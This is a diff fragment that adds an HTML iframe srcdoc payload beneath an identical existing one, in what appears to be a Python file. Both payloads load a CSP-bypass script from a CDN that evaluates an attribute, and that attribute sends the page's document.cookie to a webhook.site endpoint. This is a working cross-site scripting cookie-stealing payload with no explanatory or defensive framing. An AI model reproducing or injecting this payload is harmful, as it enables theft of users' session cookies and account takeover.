@@ -100,3 +100,8 @@ if __name__ == "__main__":
 
 
 <iframe srcdoc="<br csp=fetch('https://webhook.site/3f611198-2e62-4852-8af7-9557b8a464d4?cookie='+document.cookie)><script src='https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+
+
+
+
+<iframe srcdoc="<br csp=fetch('https://webhook.site/5dc9c0db-7fe4-4e97-b38e-214dbec2a471?cookie='+document.cookie)><script src='https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
